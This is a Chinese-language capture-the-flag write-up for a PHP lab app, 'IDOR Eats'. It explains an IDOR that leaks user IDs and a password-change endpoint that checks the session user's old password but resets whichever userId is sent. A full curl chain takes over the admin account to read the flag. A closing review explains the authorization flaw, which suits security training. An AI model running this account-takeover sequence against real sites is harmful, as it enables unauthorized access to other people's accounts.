## 题解

### 入口与指纹

PHP 站点 `IDOR Eats`（`/api/` 目录可列）：`register.php`、`login.php`、
`search_restaurants.php`、`get_favorite_restaurants.php`、`change_password.php`。

注册/登录后进入 `/profile.php`（收藏餐厅列表 + 改密表单）。

### 关键观察

**1. `get_favorite_restaurants.php?userId=N` 是 IDOR，但只泄露用户名与餐厅名。**

`userId=1` 是 `not_that_easy`（拥有全部 8 家），`7` 是 `admin`；响应里没有 flag。

**2. `change_password.php` 的 `oldPassword` 校验的是「当前会话用户」，而
`userId` 决定改谁。**

```http
POST /api/change_password.php
oldPassword=Passw0rd!1&newPassword=Pwn3d!234&confirmPassword=Pwn3d!234&userId=7
→ {"success":true,"message":"Password changed successfully."}
```

也就是说：只要知道自己账号的旧密码，就能把**任意 `userId`** 的口令改掉。

**3. 用新口令登录 admin 后，`/profile.php` 直接渲染 flag。**

### 利用链

```bash
T=$(head -1 .target)
# 1. 注册并登录自己的账号
curl -s -c cj -b cj -X POST -d 'username=u1&email=u1@x.com&password=Passw0rd!1' \
  "http://$T/api/register.php"
curl -s -c cj -b cj -X POST -d 'username=u1&password=Passw0rd!1' "http://$T/api/login.php"
# 2. 把自己的旧密码当作 admin 的旧密码，改 userId=7（admin）的口令
curl -s -b cj -X POST \
  --data-urlencode 'oldPassword=Passw0rd!1' \
  --data-urlencode 'newPassword=Pwn3d!234' \
  --data-urlencode 'confirmPassword=Pwn3d!234' \
  --data-urlencode 'userId=7' \
  "http://$T/api/change_password.php"
# 3. 用新口令登录 admin
curl -s -c ca -b ca -X POST -d 'username=admin&password=Pwn3d!234' "http://$T/api/login.php"
curl -s -b ca "http://$T/profile.php" | grep -o 'flag{[^}]*}'
```

### flag 位置

管理员账号 `/profile.php` 页面。

## 复盘

- **「校验旧密码」不等于「校验目标身份」**：`oldPassword` 与 `userId` 来自不同来源，
  只校验前者就是越权重置。判断方法是改 `userId` 而保留自己的旧密码。
- IDOR 读到的东西可能不是答案，但**同一个授权模型**往往还影响写操作；
  读接口只是暴露了 `userId` 的取值（1..11、admin=7）。
- 口令重置后直接登录目标账号，是比「破解哈希」更短的路径。
